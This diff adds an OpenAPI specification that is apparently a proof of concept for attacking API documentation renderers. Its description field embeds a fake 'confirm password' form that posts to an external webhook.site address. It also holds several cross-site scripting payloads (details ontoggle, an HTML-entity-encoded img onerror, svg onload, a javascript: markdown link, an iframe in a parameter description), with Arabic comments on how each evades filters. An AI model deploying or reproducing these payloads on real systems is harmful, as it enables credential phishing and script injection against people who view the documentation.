@@ -1,0 +1,49 @@
+openapi: "3.0.0"
+info:
+  title: "Multi-Vector XSS & Phishing PoC"
+  version: "1.0.0"
+  description: |
+    ### 1. Advanced Phishing Vector (Working)
+    <div style="padding:20px; border:1px solid #eee; border-radius:10px;">
+      <form action="https://webhook.site/59d421ff-5ace-4aaf-b44c-cdfc3920a62a" method="POST">
+        <input type="password" name="pass" placeholder="Confirm Password to View API">
+        <button type="submit">Unlock Documents</button>
+      </form>
+    </div>
+
+    ---
+    ### 2. XSS Attempt: Tag Bypassing
+    <!-- محاولة استخدام وسم تفاعلي لا يحظر عادة -->
+    <details open ontoggle="alert(document.domain)">
+      <summary>Click to reveal technical details</summary>
+    </details>
+
+    ---
+    ### 3. XSS Attempt: Encoded Payload
+    <!-- استخدام HTML Entities لتخطي الفلتر -->
+    <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#41;">
+
+    ---
+    ### 4. XSS Attempt: SVG Vector
+    <!-- الـ SVG غالباً ما يتم تجاهله من قبل الفلاتر الضعيفة -->
+    <svg onload="alert(1)">
+      <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
+    </svg>
+
+    ---
+    ### 5. XSS Attempt: Markdown Link Injection
+    <!-- محاولة حقن رابط جافا سكريبت داخل مارك داون -->
+    [Click here to verify your Hyatt account](javascript:alert('XSS_Verified'))
+
+paths:
+  /xss-test:
+    get:
+      summary: "Testing Param Injection"
+      parameters:
+        - name: "id"
+          in: "query"
+          # محاولة حقن XSS داخل وصف المعامل (Parameter Description)
+          description: "User ID <iframe src='javascript:alert(1)'></iframe>"
+      responses:
+        '200':
+          description: "Success"
